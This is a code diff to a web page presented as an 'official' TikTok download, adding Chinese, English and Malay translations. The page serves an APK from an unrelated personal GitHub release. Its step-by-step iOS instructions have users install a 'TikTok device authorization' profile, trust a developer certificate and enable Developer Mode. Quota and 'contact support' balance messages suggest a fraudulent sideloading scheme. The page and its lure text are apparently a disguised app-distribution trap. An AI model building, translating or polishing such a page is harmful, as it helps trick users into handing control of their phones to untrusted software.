@@ -492,10 +492,10 @@
             <div class="header-row">
                 <div class="logo-subtitle" id="logoSubtitle">官方下载</div>
                 <div class="lang-switcher">
-                                        <a href="?lang=zh" class="lang-btn active">CN</a>
-                                        <a href="?lang=en" class="lang-btn ">EN</a>
-                                        <a href="?lang=ms" class="lang-btn ">BM</a>
-                                    </div>
+                    <button type="button" class="lang-btn active" data-lang="zh" onclick="setLang('zh')">CN</button>
+                    <button type="button" class="lang-btn" data-lang="en" onclick="setLang('en')">EN</button>
+                    <button type="button" class="lang-btn" data-lang="ms" onclick="setLang('ms')">BM</button>
+                </div>
             </div>
         </div>
 
@@ -519,15 +519,15 @@
             <div class="app-meta">
                 <div class="meta-item">
                     <div class="meta-value" id="appVersion">31.4.0</div>
-                    <div class="meta-label">版本</div>
+                    <div class="meta-label" id="metaVersionLabel">版本</div>
                 </div>
                 <div class="meta-item">
-                    <div class="meta-value" id="appSize">180.4MB</div>
-                    <div class="meta-label">大小</div>
+                    <div class="meta-value" id="appSize">380 MB</div>
+                    <div class="meta-label" id="metaSizeLabel">大小</div>
                 </div>
                 <div class="meta-item">
                     <div class="meta-value" id="downloadCount">🔥 热门</div>
-                    <div class="meta-label">下载</div>
+                    <div class="meta-label" id="metaDownloadLabel">下载</div>
                 </div>
             </div>
 
@@ -571,8 +571,8 @@
 
             <!-- Installation Tutorial -->
             <div class="tutorial">
-                <h3>📖 安装说明</h3>
-                <ol class="tutorial-steps">
+                <h3 id="tutorialTitle">📖 安装说明</h3>
+                <ol class="tutorial-steps" id="tutorialSteps">
                     <li>点击 <strong>"安装描述文件"</strong> 按钮</li>
                     <li>弹出提示后点击 <strong>"允许"</strong></li>
                     <li>前往 <strong>设置 → 通用 → VPN与设备管理</strong></li>
@@ -683,6 +683,270 @@
             reauthorize: "\u91cd\u65b0\u6388\u6743\u8bbe\u5907"        };
 
         const ANDROID_APK = 'https://github.com/romanawatsonm/download/releases/download/v1.0/SellerCenter-Android.apk';
+        const APP_SIZE = '380 MB';
+        let viewMode = 'ios';
+        let currentLang = 'zh';
+
+        const COPY = {
+            zh: {
+                html: 'zh-CN',
+                versionLabel: '版本',
+                sizeLabel: '大小',
+                downloadLabel: '下载',
+                hot: '🔥 热门',
+                iosSubtitle: 'iOS 官方下载',
+                androidSubtitle: 'Android 官方下载',
+                desktopSubtitle: '请用手机打开',
+                titleIos: 'TikTok - iOS下载',
+                titleAndroid: 'TikTok - Android下载',
+                titleDesktop: 'TikTok - 下载',
+                androidHint: '适用于 Android 手机，下载后按提示安装。',
+                desktopHint: '电脑上可下载 Android 安装包。iPhone 请用 Safari 打开本页。',
+                androidBtn: '下载 Android 安装包',
+                safari: '⚠️ 请使用 <strong>Safari浏览器</strong> 打开此页面',
+                inappIos: '请点击右上角 ···<br>选择「在 Safari 中打开」',
+                inappOther: '请点击右上角 ···<br>选择「在浏览器中打开」',
+                tutorialTitle: '📖 安装说明',
+                steps: [
+                    '点击 <strong>"安装描述文件"</strong> 按钮',
+                    '弹出提示后点击 <strong>"允许"</strong>',
+                    '前往 <strong>设置 → 通用 → VPN与设备管理</strong>',
+                    '找到 <strong>"TikTok设备授权"</strong> → 点击 <strong>安装</strong>',
+                    '返回此页面，点击 <strong>"安装应用"</strong>',
+                    '安装完成后，再次前往 <strong>设置 → 通用 → VPN与设备管理</strong> → 信任证书',
+                    '若打开 App 提示"需要开发者模式"，前往 <strong>设置 → 隐私与安全性 → 开发者模式</strong>，打开开关并按提示<strong>重启设备</strong>'
+                ]
+            },
+            en: {
+                html: 'en',
+                versionLabel: 'Version',
+                sizeLabel: 'Size',
+                downloadLabel: 'Downloads',
+                hot: '🔥 Popular',
+                iosSubtitle: 'Official iOS download',
+                androidSubtitle: 'Official Android download',
+                desktopSubtitle: 'Open on your phone',
+                titleIos: 'TikTok - iOS download',
+                titleAndroid: 'TikTok - Android download',
+                titleDesktop: 'TikTok - Download',
+                androidHint: 'For Android phones. Install after the download finishes.',
+                desktopHint: 'Download the Android package here. On iPhone, open this page in Safari.',
+                androidBtn: 'Download Android package',
+                safari: '⚠️ Please open this page in <strong>Safari</strong>',
+                inappIos: 'Tap ··· at the top right<br>and choose “Open in Safari”',
+                inappOther: 'Tap ··· at the top right<br>and choose “Open in browser”',
+                tutorialTitle: '📖 How to install',
+                steps: [
+                    'Tap <strong>Install profile</strong>',
+                    'Tap <strong>Allow</strong> on the prompt',
+                    'Go to <strong>Settings → General → VPN & Device Management</strong>',
+                    'Open <strong>TikTok device authorization</strong> and tap <strong>Install</strong>',
+                    'Return here and tap <strong>Install app</strong>',
+                    'After install, open <strong>Settings → General → VPN & Device Management</strong> and trust the certificate',
+                    'If the app asks for Developer Mode, go to <strong>Settings → Privacy & Security → Developer Mode</strong>, turn it on, and <strong>restart</strong>'
+                ],
+                msg: {
+                    downloading_cert: 'Downloading certificate...',
+                    waiting_install: '👉 Finish install in Settings',
+                    verifying: 'Verifying authorization...',
+                    verifying_status: '⏳ Verifying device authorization, please wait...',
+                    install_profile_hint: '📱 Go to Settings → General → VPN & Device Management and install the profile',
+                    auth_success: '✅ Device authorized. Tap the button below to install the app',
+                    auth_success_short: '✅ Authorized',
+                    auth_success_jumping: '✅ Device authorized. Continuing...',
+                    retry_install: 'Install profile again',
+                    timeout: '⏰ Timed out. Tap the button to install the profile again',
+                    auth_waiting: 'Authorizing, please wait…',
+                    auth_slow: '⏳ This authorization is taking longer. Please retry in a few minutes',
+                    auth_slow_btn: 'Retry in a few minutes',
+                    signing: 'Signing for your device...',
+                    signing_status: '⏳ Signing for your device, please wait (about 10–30s)...',
+                    installing: 'Installing...',
+                    install_prompt: '📲 Installing. Tap Install on the prompt',
+                    check_desktop: 'Installing, check your Home Screen',
+                    downloading: '📱 The package is downloading. Check your Home Screen',
+                    trust_cert: '💡 After install, trust the developer in Settings → General → VPN & Device Management',
+                    done_trust: 'Done. Return to the Home Screen',
+                    go_home_hint: '🏠 Press Home or swipe up to see the app',
+                    retry: 'Retry install',
+                    install_failed: 'Install failed, please retry',
+                    network_error: '❌ Network error, please retry',
+                    complete_step1: 'Finish step 1 to authorize this device first',
+                    step1_btn: 'Step 1: Install profile',
+                    step2_btn: 'Step 2: Install app',
+                    status_init: 'Tap the button below to start',
+                    profile_cancelled: '⚠️ Install looks cancelled. Tap the button again',
+                    profile_download_failed: '❌ Profile download failed. Check the network and retry',
+                    still_waiting: '⏳ Still waiting... If you already installed it, please wait',
+                    cancel_waiting: 'Cancel waiting',
+                    step1_hint_waiting: '📱 Finish the downloaded profile in Settings, or cancel and retry',
+                    signing_timeout: '⏰ Signing timed out, please retry',
+                    signing_failed: '❌ Signing failed: ',
+                    device_not_registered: '❌ Device is not registered. Install the profile again',
+                    reinstall_profile: 'Install profile again',
+                    no_quota: '❌ No download quota',
+                    quota_exhausted: '❌ Balance is insufficient. Contact support',
+                    reauthorize: 'Authorize device again'
+                }
+            },
+            ms: {
+                html: 'ms',
+                versionLabel: 'Versi',
+                sizeLabel: 'Saiz',
+                downloadLabel: 'Muat turun',
+                hot: '🔥 Popular',
+                iosSubtitle: 'Muat turun rasmi iOS',
+                androidSubtitle: 'Muat turun rasmi Android',
+                desktopSubtitle: 'Buka dengan telefon',
+                titleIos: 'TikTok - Muat turun iOS',
+                titleAndroid: 'TikTok - Muat turun Android',
+                titleDesktop: 'TikTok - Muat turun',
+                androidHint: 'Untuk telefon Android. Pasang selepas muat turun selesai.',
+                desktopHint: 'Muat turun pakej Android di sini. iPhone: buka halaman ini dengan Safari.',
+                androidBtn: 'Muat turun pakej Android',
+                safari: '⚠️ Sila buka halaman ini dengan <strong>Safari</strong>',
+                inappIos: 'Ketik ··· di penjuru kanan atas<br>dan pilih “Buka dalam Safari”',
+                inappOther: 'Ketik ··· di penjuru kanan atas<br>dan pilih “Buka dalam pelayar”',
+                tutorialTitle: '📖 Cara pasang',
+                steps: [
+                    'Ketik butang <strong>Pasang profil</strong>',
+                    'Ketik <strong>Benarkan</strong> pada gesaan',
+                    'Pergi ke <strong>Tetapan → Umum → VPN & Pengurusan Peranti</strong>',
+                    'Buka <strong>kebenaran peranti TikTok</strong> dan ketik <strong>Pasang</strong>',
+                    'Kembali ke halaman ini dan ketik <strong>Pasang aplikasi</strong>',
+                    'Selepas pasang, buka <strong>Tetapan → Umum → VPN & Pengurusan Peranti</strong> dan percayai sijil',
+                    'Jika aplikasi minta Mod Pembangun, pergi ke <strong>Tetapan → Privasi & Keselamatan → Mod Pembangun</strong>, hidupkan, kemudian <strong>mula semula</strong>'
+                ],
+                msg: {
+                    downloading_cert: 'Memuat turun sijil...',
+                    waiting_install: '👉 Selesaikan pemasangan dalam Tetapan',
+                    verifying: 'Mengesahkan kebenaran...',
+                    verifying_status: '⏳ Mengesahkan peranti, sila tunggu...',
+                    install_profile_hint: '📱 Pergi ke Tetapan → Umum → VPN & Pengurusan Peranti dan pasang profil',
+                    auth_success: '✅ Peranti dibenarkan. Ketik butang di bawah untuk pasang aplikasi',
+                    auth_success_short: '✅ Dibenarkan',
+                    auth_success_jumping: '✅ Peranti dibenarkan. Meneruskan...',
+                    retry_install: 'Pasang profil semula',
+                    timeout: '⏰ Masa tamat. Ketik butang untuk pasang profil semula',
+                    auth_waiting: 'Membenarkan, sila tunggu…',
+                    auth_slow: '⏳ Kebenaran ini mengambil masa lebih lama. Cuba lagi selepas beberapa minit',
+                    auth_slow_btn: 'Cuba lagi selepas beberapa minit',
+                    signing: 'Menandatangani untuk peranti anda...',
+                    signing_status: '⏳ Menandatangani peranti anda, sila tunggu (kira-kira 10–30s)...',
+                    installing: 'Memasang...',
+                    install_prompt: '📲 Memasang. Ketik Pasang pada gesaan',
+                    check_desktop: 'Sedang dipasang, semak skrin utama',
+                    downloading: '📱 Pakej sedang dimuat turun. Semak skrin utama',
+                    trust_cert: '💡 Selepas pasang, percayai pembangun di Tetapan → Umum → VPN & Pengurusan Peranti',
+                    done_trust: 'Selesai. Kembali ke skrin utama',
+                    go_home_hint: '🏠 Tekan Home atau leret ke atas untuk melihat aplikasi',
+                    retry: 'Cuba pasang semula',
+                    install_failed: 'Pemasangan gagal, sila cuba lagi',
+                    network_error: '❌ Ralat rangkaian, sila cuba lagi',
+                    complete_step1: 'Selesaikan langkah 1 untuk benarkan peranti ini dahulu',
+                    step1_btn: 'Langkah 1: Pasang profil',
+                    step2_btn: 'Langkah 2: Pasang aplikasi',
+                    status_init: 'Ketik butang di bawah untuk mula',
+                    profile_cancelled: '⚠️ Pemasangan kelihatan dibatalkan. Ketik butang sekali lagi',
+                    profile_download_failed: '❌ Muat turun profil gagal. Semak rangkaian dan cuba lagi',
+                    still_waiting: '⏳ Masih menunggu... Jika sudah dipasang, sila tunggu',
+                    cancel_waiting: 'Batal menunggu',
+                    step1_hint_waiting: '📱 Selesaikan profil yang dimuat turun dalam Tetapan, atau batal dan cuba lagi',
+                    signing_timeout: '⏰ Tandatangan tamat masa, sila cuba lagi',
+                    signing_failed: '❌ Tandatangan gagal: ',
+                    device_not_registered: '❌ Peranti tidak berdaftar. Pasang profil semula',
+                    reinstall_profile: 'Pasang profil semula',
+                    no_quota: '❌ Tiada kuota muat turun',
+                    quota_exhausted: '❌ Baki tidak mencukupi. Hubungi khidmat pelanggan',
+                    reauthorize: 'Benarkan peranti semula'
+                }
+            }
+        };
+
+        const LANG_ZH = Object.assign({}, LANG);
+
+        function setLang(code) {
+            if (!COPY[code]) code = 'zh';
+            currentLang = code;
+            try { localStorage.setItem('dl_lang', code); } catch (e) {}
+            const t = COPY[code];
+            const msg = code === 'zh' ? LANG_ZH : t.msg;
+            Object.keys(LANG_ZH).forEach(function (key) {
+                if (msg && msg[key] != null) LANG[key] = msg[key];
+            });
+            document.documentElement.lang = t.html;
+            document.querySelectorAll('.lang-btn').forEach(function (btn) {
+                btn.classList.toggle('active', btn.getAttribute('data-lang') === code);
+            });
+            const setText = function (id, value) {
+                const el = document.getElementById(id);
+                if (el && value != null) el.textContent = value;
+            };
+            setText('metaVersionLabel', t.versionLabel);
+            setText('metaSizeLabel', t.sizeLabel);
+            setText('metaDownloadLabel', t.downloadLabel);
+            setText('downloadCount', t.hot);
+            setText('appSize', APP_SIZE);
+            setText('tutorialTitle', t.tutorialTitle);
+            const steps = document.getElementById('tutorialSteps');
+            if (steps) {
+                steps.innerHTML = t.steps.map(function (line) { return '<li>' + line + '</li>'; }).join('');
+            }
+            const safari = document.getElementById('safariWarning');
+            if (safari) safari.innerHTML = t.safari;
+            const inapp = document.getElementById('inappText');
+            if (inapp) inapp.innerHTML = isIOS() ? t.inappIos : t.inappOther;
+            const step1 = document.querySelector('#btnGetUdid span:last-child');
+            const step2 = document.querySelector('#btnInstall span:last-child');
+            if (step1 && !document.getElementById('btnGetUdid').disabled) step1.textContent = LANG.step1_btn;
+            if (step2 && !document.getElementById('btnInstall').disabled) step2.textContent = LANG.step2_btn;
+            const status = document.getElementById('statusBox');
+            if (status && viewMode === 'ios' && currentStep === 1 && !isProcessing) status.textContent = LANG.status_init;
+            const url = new URL(window.location.href);
+            url.searchParams.set('lang', code);
+            window.history.replaceState({}, '', url.pathname + url.search);
+            applyViewCopy();
+        }
+
+        function applyViewCopy() {
+            const t = COPY[currentLang] || COPY.zh;
+            const sub = document.getElementById('logoSubtitle');
+            const hint = document.getElementById('androidHint');
+            const btnLabel = document.querySelector('#btnAndroid span:last-child');
+            if (viewMode === 'android') {
+                document.title = t.titleAndroid;
+                if (sub) sub.textContent = t.androidSubtitle;
+                if (hint) hint.textContent = t.androidHint;
+                if (btnLabel) btnLabel.textContent = t.androidBtn;
+                const ver = document.getElementById('appVersion');
+                if (ver) ver.textContent = 'Android';
+            } else if (viewMode === 'desktop') {
+                document.title = t.titleDesktop;
+                if (sub) sub.textContent = t.desktopSubtitle;
+                if (hint) hint.textContent = t.desktopHint;
+                if (btnLabel) btnLabel.textContent = t.androidBtn;
+                const ver = document.getElementById('appVersion');
+                if (ver) ver.textContent = 'Android';
+            } else {
+                document.title = t.titleIos;
+                if (sub) sub.textContent = t.iosSubtitle;
+            }
+            const size = document.getElementById('appSize');
+            if (size) size.textContent = APP_SIZE;
+        }
+
+        function preferredLang() {
+            const q = new URLSearchParams(window.location.search).get('lang');
+            if (q === 'zh' || q === 'en' || q === 'ms') return q;
+            try {
+                const saved = localStorage.getItem('dl_lang');
+                if (saved === 'zh' || saved === 'en' || saved === 'ms') return saved;
+            } catch (e) {}
+            const nav = (navigator.language || '').toLowerCase();
+            if (nav.indexOf('zh') === 0) return 'zh';
+            if (nav.indexOf('ms') === 0) return 'ms';
+            return 'en';
+        }
 
         function ua() {
             return navigator.userAgent || '';
@@ -719,13 +983,7 @@
         }
 
         function applyAndroidView() {
-            document.title = 'TikTok - Android下载';
-            const sub = document.getElementById('logoSubtitle');
-            if (sub) sub.textContent = 'Android 官方下载';
-            const ver = document.getElementById('appVersion');
-            const size = document.getElementById('appSize');
-            if (ver) ver.textContent = 'Android';
-            if (size) size.textContent = '380MB';
+            viewMode = 'android';
             const panel = document.getElementById('androidPanel');
             const flow = document.getElementById('iosFlow');
             const btn = document.getElementById('btnAndroid');
@@ -734,23 +992,18 @@
             if (flow) flow.classList.add('hidden');
             const warn = document.getElementById('safariWarning');
             if (warn) warn.classList.add('hidden');
+            applyViewCopy();
         }
 
         function applyDesktopView() {
-            document.title = 'TikTok - 下载';
-            const sub = document.getElementById('logoSubtitle');
-            if (sub) sub.textContent = '请用手机打开';
+            viewMode = 'desktop';
             const panel = document.getElementById('androidPanel');
-            const hint = document.getElementById('androidHint');
             const flow = document.getElementById('iosFlow');
             const btn = document.getElementById('btnAndroid');
-            if (btn) {
-                btn.href = ANDROID_APK;
-                btn.querySelector('span:last-child').textContent = '下载 Android 安装包';
-            }
-            if (hint) hint.textContent = '电脑上可下载 Android 安装包。iPhone 请用 Safari 打开本页。';
+            if (btn) btn.href = ANDROID_APK;
             if (panel) panel.classList.remove('hidden');
             if (flow) flow.classList.add('hidden');
+            applyViewCopy();
         }
 
         // Current state
@@ -783,6 +1036,7 @@
 
         // Page load
         document.addEventListener('DOMContentLoaded', function() {
+            setLang(preferredLang());
             if (isInAppBrowser()) showInAppHint();
 
             const urlParamsEarly = new URLSearchParams(window.location.search);
@@ -797,9 +1051,8 @@
                 return;
             }
 
-            document.title = 'TikTok - iOS下载';
-            const sub = document.getElementById('logoSubtitle');
-            if (sub) sub.textContent = 'iOS 官方下载';
+            viewMode = 'ios';
+            applyViewCopy();
 
             // Non-Safari warning
             if (isIOS() && !isSafari()) {
@@ -983,10 +1236,7 @@
         };
         // 浏览器语言判定：以 zh 开头(zh / zh-CN / zh-Hant …)→ 中文；其余一律英文
         function guideLang() {
-            const langs = (navigator.languages && navigator.languages.length)
-                ? navigator.languages
-                : [navigator.language || navigator.userLanguage || 'en'];
-            return /^zh\b|^zh-/i.test(langs[0] || '') ? 'zh' : 'en';
+            return currentLang === 'zh' ? 'zh' : 'en';
         }
         function applyGuideLang() {
             const t = IG_TEXT[guideLang()];
